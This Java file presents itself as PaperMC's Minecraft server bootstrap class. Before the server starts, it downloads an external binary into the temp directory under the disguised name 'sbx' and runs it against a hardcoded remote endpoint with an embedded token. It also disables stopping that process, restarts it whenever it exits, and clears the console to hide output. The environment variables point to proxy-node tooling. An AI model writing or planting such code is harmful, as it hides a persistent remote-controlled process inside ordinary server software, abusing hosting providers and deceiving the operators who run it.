package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process komariProcess;

    // Komari Agent的配置常量
    private static final class KomariConfig {
        // 按架构区分的下载地址（请确认amd64地址正确性）
        public static final String DOWNLOAD_URL_AMD64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64";
        public static final String DOWNLOAD_URL_ARM64 = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64";
        // 原s-box的路径：系统临时目录 + "sbx"
        public static final String AGENT_FILE_NAME = "sbx";
        // 启动参数
        public static final List<String> NEW_ARGS = Arrays.asList(
            "-e", "https://vps.z1000.dpdns.org:10736",
            "-t", "JzerczYfCF4Secuy9vtYaB"
        );
    }

    // 原有的环境变量数组（若不需要可删除）
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // 检查java版本
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            // 启动Komari Agent（并启动守护线程监控）
            runKomariAgent();
            // 启动Komari守护线程，保证进程意外退出后重启（可选，可注释掉）
            startKomariDaemonThread();

            // 【关键修改1】移除JVM关闭钩子中停止Komari的逻辑
            // 原逻辑：Runtime.getRuntime().addShutdownHook(...) 已删除，仅保留钩子的必要逻辑（若有）
            // 若需要保留钩子但不停止Komari，可改为如下：
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                // 移除停止Komari的代码，仅标记状态
                System.out.println(ANSI_RED + "JVM is shutting down, Komari agent keeps running..." + ANSI_RESET);
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }
    
    // 启动Komari Agent的方法
    private static void runKomariAgent() throws Exception {
        // 若不需要环境变量，可删除以下逻辑
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        // 获取Komari路径
        Path agentPath = getKomariAgentPath();
        // 构建启动命令（路径 + 参数）
        List<String> command = new ArrayList<>();
        command.add(agentPath.toString());
        command.addAll(KomariConfig.NEW_ARGS);
        
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        komariProcess = pb.start();
        System.out.println(ANSI_GREEN + "Komari agent started and will keep running permanently." + ANSI_RESET);
    }

    // 获取Komari路径（原s-box的系统临时目录路径）
    private static Path getKomariAgentPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        // 架构判断
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = KomariConfig.DOWNLOAD_URL_AMD64;
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = KomariConfig.DOWNLOAD_URL_ARM64;
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        // 原s-box路径：系统临时目录 + sbx
        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), KomariConfig.AGENT_FILE_NAME);

        // 下载并赋权
        if (!Files.exists(agentPath)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!agentPath.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for komari-agent");
            }
        }
        return agentPath;
    }

    // 【关键修改2】禁用停止Komari的方法，改为仅提示或空方法
    private static void stopKomariAgent() {
        // 移除销毁进程的逻辑，改为提示
        System.out.println(ANSI_RED + "Komari agent is not allowed to stop, operation ignored." + ANSI_RESET);
        // 若完全不需要，可直接留空
    }

    // 【新增】启动Komari守护线程，监控进程状态，意外退出则重启
    private static void startKomariDaemonThread() {
        Thread daemonThread = new Thread(() -> {
            while (running.get()) {
                try {
                    // 检查Komari进程是否存活
                    if (komariProcess == null || !komariProcess.isAlive()) {
                        System.err.println(ANSI_RED + "Komari agent process exited unexpectedly, restarting..." + ANSI_RESET);
                        // 重启Komari Agent
                        runKomariAgent();
                    }
                    // 每隔5秒检查一次进程状态
                    Thread.sleep(5000);
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "Error restarting Komari agent: " + e.getMessage() + ANSI_RESET);
                }
            }
        });
        // 设置为守护线程，不影响JVM退出（但Komari进程本身是独立的系统进程）
        daemonThread.setDaemon(true);
        daemonThread.setName("KomariAgentDaemon");
        daemonThread.start();
    }

    // 原有的环境变量加载方法（若不需要可删除）
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "25812");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "Mc");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    // 原有的版本信息方法
    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion,
                javaVmName,
                javaVmVersion,
                javaVendor,
                javaVendorVersion,
                osName,
                osVersion,
                osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
}
